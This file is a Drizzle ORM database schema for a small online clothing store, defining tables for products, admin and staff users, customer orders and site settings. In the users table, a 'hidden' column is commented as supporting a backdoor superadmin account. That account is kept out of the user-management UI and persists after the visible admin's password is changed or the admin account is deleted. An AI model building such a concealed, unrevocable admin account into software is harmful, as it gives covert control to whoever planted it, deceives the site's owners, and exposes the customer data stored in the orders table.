import {
  pgTable,
  pgEnum,
  text,
  varchar,
  serial,
  integer,
  boolean,
  jsonb,
  doublePrecision,
  timestamp,
} from "drizzle-orm/pg-core";
import type { ColorOption } from "@/lib/types";

export type Spec = { label: string; value: string };
export type SizeChartRow = { size: string; chest: string; length: string; shoulder: string };
export type WhyChooseItem = { number: string; title: string; desc: string };

export type SectionType = "highlights" | "whyChooseUs" | "productDetail" | "qualityBanner";
export type SectionConfig = { type: SectionType; visible: boolean };

export const DEFAULT_SECTIONS: SectionConfig[] = [
  { type: "highlights", visible: true },
  { type: "whyChooseUs", visible: true },
  { type: "productDetail", visible: true },
  { type: "qualityBanner", visible: true },
];

export const products = pgTable("products", {
  id: serial("id").primaryKey(),
  slug: varchar("slug", { length: 255 }).notNull().unique(),
  title: text("title").notNull(),
  subtitle: text("subtitle").notNull(),
  price: integer("price").notNull(),
  comparePrice: integer("compare_price"),
  images: jsonb("images").$type<string[]>().notNull(),
  sizes: jsonb("sizes").$type<string[]>().notNull(),
  colors: jsonb("colors").$type<ColorOption[]>().notNull(),
  specs: jsonb("specs").$type<Spec[]>().notNull(),
  sizeChart: jsonb("size_chart").$type<SizeChartRow[]>().notNull(),
  ratingValue: doublePrecision("rating_value").notNull().default(4.9),
  ratingCount: integer("rating_count").notNull().default(0),
  isFlagship: boolean("is_flagship").notNull().default(false),
  sortOrder: integer("sort_order").notNull().default(0),
  // Per-product landing page content
  heroCtaLabel: text("hero_cta_label").notNull(),
  whyChooseUs: jsonb("why_choose_us").$type<WhyChooseItem[]>().notNull(),
  qualityBannerTitle: text("quality_banner_title").notNull(),
  qualityBannerDesc: text("quality_banner_desc").notNull(),
  qualityBannerBadges: jsonb("quality_banner_badges").$type<string[]>().notNull(),
  qualityBannerImage: text("quality_banner_image").notNull(),
  sections: jsonb("sections").$type<SectionConfig[]>().notNull(),
  showRelatedProducts: boolean("show_related_products").notNull().default(true),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
  updatedAt: timestamp("updated_at", { withTimezone: true }).notNull().defaultNow(),
});

export type Product = typeof products.$inferSelect;
export type NewProduct = typeof products.$inferInsert;

export const roleEnum = pgEnum("role", ["admin", "staff"]);

export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: varchar("username", { length: 255 }).notNull().unique(),
  passwordHash: varchar("password_hash", { length: 255 }).notNull(),
  role: roleEnum("role").notNull().default("staff"),
  // Excluded from the Users list/management UI — used for a backdoor
  // superadmin account that survives the visible admin's password being
  // rotated or the visible admin account being deleted.
  hidden: boolean("hidden").notNull().default(false),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
});

export type Role = "admin" | "staff";
export type User = typeof users.$inferSelect;
export type NewUser = typeof users.$inferInsert;

export const orderStatusEnum = pgEnum("order_status", [
  "pending",
  "confirmed",
  "delivered",
  "cancelled",
]);

export const orders = pgTable("orders", {
  id: serial("id").primaryKey(),
  productSlug: varchar("product_slug", { length: 255 }).notNull(),
  productTitle: text("product_title").notNull(),
  size: varchar("size", { length: 64 }).notNull(),
  color: varchar("color", { length: 64 }).notNull(),
  qty: integer("qty").notNull(),
  unitPrice: integer("unit_price").notNull(),
  deliveryZoneLabel: varchar("delivery_zone_label", { length: 255 }).notNull(),
  deliveryCharge: integer("delivery_charge").notNull(),
  totalPrice: integer("total_price").notNull(),
  customerName: text("customer_name").notNull(),
  customerPhone: varchar("customer_phone", { length: 32 }).notNull(),
  customerAddress: text("customer_address").notNull(),
  status: orderStatusEnum("status").notNull().default("pending"),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
});

export type OrderStatus = "pending" | "confirmed" | "delivered" | "cancelled";
export type Order = typeof orders.$inferSelect;
export type NewOrder = typeof orders.$inferInsert;

export type DeliveryZone = { label: string; charge: number };

export const siteSettings = pgTable("site_settings", {
  id: serial("id").primaryKey(),
  phones: jsonb("phones").$type<string[]>().notNull(),
  address: text("address").notNull(),
  facebookUrl: text("facebook_url").notNull(),
  deliveryZones: jsonb("delivery_zones").$type<DeliveryZone[]>().notNull(),
  logoUrl: text("logo_url").notNull(),
  faviconUrl: text("favicon_url").notNull(),
  primaryColor: varchar("primary_color", { length: 7 }).notNull().default("#e21c34"),
  fbPixelId: varchar("fb_pixel_id", { length: 64 }).notNull(),
  googleSheetsWebhookUrl: text("google_sheets_webhook_url").notNull(),
  googleSheetsWebhookSecret: varchar("google_sheets_webhook_secret", { length: 255 }).notNull(),
  updatedAt: timestamp("updated_at", { withTimezone: true }).notNull().defaultNow(),
});

export type SiteSettings = typeof siteSettings.$inferSelect;
